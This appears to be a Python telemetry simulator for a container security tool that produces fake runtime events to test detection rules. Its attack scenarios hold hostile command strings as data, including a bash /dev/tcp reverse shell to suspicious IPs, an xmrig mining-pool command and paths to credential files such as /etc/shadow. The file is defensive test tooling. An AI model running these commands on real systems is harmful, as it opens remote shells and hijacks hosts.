"""
CloudGuard Telemetry Simulator

Generates realistic but harmless simulated runtime events for:
- Testing the detection pipeline
- Demo mode
- Attack simulation scenarios

All simulated events are clearly tagged with source="simulated".
No real system calls or attacks are performed.
"""
import uuid
import random
import asyncio
from datetime import datetime, timezone, timedelta
from typing import List, Optional
from dataclasses import dataclass


# ─── Simulated Container Registry ────────────────────────────────────────────

SIMULATED_CONTAINERS = [
    {"container_id": "sim-web-api-01", "name": "web-api", "image": "nginx:latest", "host": "node-01"},
    {"container_id": "sim-auth-svc-02", "name": "auth-service", "image": "auth:2.1", "host": "node-01"},
    {"container_id": "sim-db-proxy-03", "name": "db-proxy", "image": "pgbouncer:1.18", "host": "node-02"},
    {"container_id": "sim-worker-04", "name": "background-worker", "image": "worker:latest", "host": "node-02"},
    {"container_id": "sim-gateway-05", "name": "api-gateway", "image": "envoy:1.28", "host": "node-03"},
]

# ─── Normal Activity Templates ────────────────────────────────────────────────

NORMAL_PROCESSES = [
    "nginx", "node", "python3", "java", "gunicorn",
    "postgres", "redis-server", "envoy", "curl",
]

INTERNAL_IPS = ["10.0.0.1", "10.0.0.2", "172.17.0.1", "192.168.1.1"]
EXTERNAL_IPS = ["8.8.8.8", "1.1.1.1", "34.120.0.1", "52.86.200.1"]
SUSPICIOUS_IPS = ["185.220.101.1", "198.51.100.1", "45.33.32.156", "91.121.34.12"]
MINING_POOL_IPS = ["pool.minexmr.com", "xmrpool.eu", "monero.crypto-pool.fr"]

FILE_PATHS_NORMAL = ["/app/logs/app.log", "/tmp/cache", "/var/run/app.pid", "/app/config.json"]
FILE_PATHS_SENSITIVE = ["/etc/passwd", "/etc/shadow", "/root/.ssh/authorized_keys", "/proc/1/mem"]


def make_event(event_type: str, container: dict, **kwargs) -> dict:
    """Build a normalized event dict (matches EventIngest schema)."""
    return {
        "event_type": event_type,
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "container_id": container["container_id"],
        "container_name": container["name"],
        "host": container["host"],
        "source": "simulated",
        **kwargs,
    }


def generate_normal_event(container: dict) -> dict:
    """Generate a benign runtime event."""
    event_type = random.choice([
        "PROCESS_EXEC", "PROCESS_EXEC", "PROCESS_EXEC",  # weighted common
        "NET_CONNECT", "NET_CONNECT",
        "FILE_MODIFY",
    ])

    if event_type == "PROCESS_EXEC":
        return make_event(event_type, container,
                          process_name=random.choice(NORMAL_PROCESSES),
                          process_pid=random.randint(100, 9999),
                          parent_process="supervisor",
                          user="appuser",
                          user_uid=1000,
                          severity="LOW")

    elif event_type == "NET_CONNECT":
        return make_event(event_type, container,
                          source_ip=container["container_id"][:8],
                          destination_ip=random.choice(INTERNAL_IPS),
                          destination_port=random.choice([80, 443, 5432, 6379]),
                          protocol="TCP",
                          severity="LOW")

    else:  # FILE_MODIFY
        return make_event(event_type, container,
                          file_path=random.choice(FILE_PATHS_NORMAL),
                          file_operation="write",
                          process_name=random.choice(NORMAL_PROCESSES),
                          severity="LOW")


# ─── Attack Scenario Generators ───────────────────────────────────────────────

def scenario_suspicious_shell(container: dict) -> List[dict]:
    """Scenario: Suspicious shell execution inside container."""
    shell = random.choice(["bash", "sh", "zsh"])
    pid = random.randint(1000, 9999)
    return [
        make_event("PROCESS_EXEC", container,
                   process_name=shell,
                   process_pid=pid,
                   parent_process="nginx",
                   command_line=f"{shell} -i",
                   user="www-data",
                   user_uid=33,
                   severity="MEDIUM"),
    ]


def scenario_reverse_shell(container: dict) -> List[dict]:
    """Scenario: Reverse shell — shell execution followed by outbound connection."""
    shell = "bash"
    pid = random.randint(1000, 9999)
    dst_ip = random.choice(SUSPICIOUS_IPS)
    events = [
        make_event("SHELL_EXEC", container,
                   process_name=shell,
                   process_pid=pid,
                   parent_process="apache2",
                   command_line=f"bash -i >& /dev/tcp/{dst_ip}/4444 0>&1",
                   user="www-data",
                   user_uid=33,
                   severity="HIGH"),
        make_event("NET_CONNECT", container,
                   process_name=shell,
                   process_pid=pid,
                   destination_ip=dst_ip,
                   destination_port=4444,
                   protocol="TCP",
                   severity="CRITICAL"),
    ]
    return events


def scenario_privilege_escalation(container: dict) -> List[dict]:
    """Scenario: Privilege escalation attempt."""
    pid = random.randint(1000, 9999)
    return [
        make_event("PROCESS_EXEC", container,
                   process_name="sudo",
                   process_pid=pid,
                   parent_process="bash",
                   command_line="sudo su -",
                   user="appuser",
                   user_uid=1000,
                   severity="HIGH"),
        make_event("PRIV_CHANGE", container,
                   process_name="su",
                   process_pid=pid + 1,
                   parent_process="sudo",
                   user="root",
                   user_uid=0,
                   severity="HIGH"),
    ]


def scenario_cryptomining(container: dict) -> List[dict]:
    """Scenario: Cryptomining behavior — miner process + mining pool connection."""
    pid = random.randint(1000, 9999)
    pool_ip = random.choice(["185.130.216.2", "195.201.105.118"])
    return [
        make_event("PROCESS_EXEC", container,
                   process_name="xmrig",
                   process_pid=pid,
                   parent_process="bash",
                   command_line="xmrig -o pool.minexmr.com:4444 -u wallet123",
                   user="root",
                   user_uid=0,
                   severity="HIGH"),
        make_event("NET_CONNECT", container,
                   process_name="xmrig",
                   process_pid=pid,
                   destination_ip=pool_ip,
                   destination_port=4444,
                   protocol="TCP",
                   severity="HIGH"),
    ]


def scenario_rapid_file_modification(container: dict) -> List[dict]:
    """Scenario: High-volume file modification (ransomware-like behavior)."""
    events = []
    pid = random.randint(1000, 9999)
    for i in range(10):  # simulate a burst
        events.append(make_event("FILE_MODIFY", container,
                                 process_name="encryptor",
                                 process_pid=pid,
                                 parent_process="bash",
                                 file_path=f"/app/data/file_{i:04d}.dat",
                                 file_operation="write",
                                 user="root",
                                 user_uid=0,
                                 severity="HIGH"))
    return events


def scenario_suspicious_connection(container: dict) -> List[dict]:
    """Scenario: Connection to suspicious external IP."""
    pid = random.randint(1000, 9999)
    dst_ip = random.choice(SUSPICIOUS_IPS)
    return [
        make_event("NET_CONNECT", container,
                   process_name="curl",
                   process_pid=pid,
                   parent_process="bash",
                   destination_ip=dst_ip,
                   destination_port=random.choice([1337, 31337, 9999, 6666]),
                   protocol="TCP",
                   severity="MEDIUM"),
    ]


# ─── Attack Scenario Registry ─────────────────────────────────────────────────

ATTACK_SCENARIOS = {
    "suspicious_shell": {
        "name": "Suspicious Shell Execution",
        "description": "Unexpected shell executed inside a running container",
        "generator": scenario_suspicious_shell,
        "expected_rules": ["RULE-001"],
        "expected_severity": "MEDIUM",
    },
    "reverse_shell": {
        "name": "Reverse Shell Attack",
        "description": "Shell spawns and immediately connects back to attacker C2",
        "generator": scenario_reverse_shell,
        "expected_rules": ["RULE-001", "RULE-002"],
        "expected_severity": "CRITICAL",
    },
    "privilege_escalation": {
        "name": "Privilege Escalation",
        "description": "Process attempts to gain root privileges inside container",
        "generator": scenario_privilege_escalation,
        "expected_rules": ["RULE-003"],
        "expected_severity": "HIGH",
    },
    "cryptomining": {
        "name": "Cryptomining Activity",
        "description": "Cryptominer process connects to mining pool",
        "generator": scenario_cryptomining,
        "expected_rules": ["RULE-005"],
        "expected_severity": "HIGH",
    },
    "rapid_file_modification": {
        "name": "Rapid File Modification",
        "description": "High-volume file modification resembling ransomware",
        "generator": scenario_rapid_file_modification,
        "expected_rules": ["RULE-006"],
        "expected_severity": "HIGH",
    },
    "suspicious_connection": {
        "name": "Suspicious External Connection",
        "description": "Container contacts unknown suspicious external IP",
        "generator": scenario_suspicious_connection,
        "expected_rules": ["RULE-004"],
        "expected_severity": "MEDIUM",
    },
}


def generate_attack_scenario(scenario_name: str, container: Optional[dict] = None) -> List[dict]:
    """Generate events for a specific attack scenario."""
    if scenario_name not in ATTACK_SCENARIOS:
        raise ValueError(f"Unknown scenario: {scenario_name}. Available: {list(ATTACK_SCENARIOS.keys())}")

    container = container or random.choice(SIMULATED_CONTAINERS)
    scenario = ATTACK_SCENARIOS[scenario_name]
    return scenario["generator"](container)


def get_random_container() -> dict:
    return random.choice(SIMULATED_CONTAINERS)
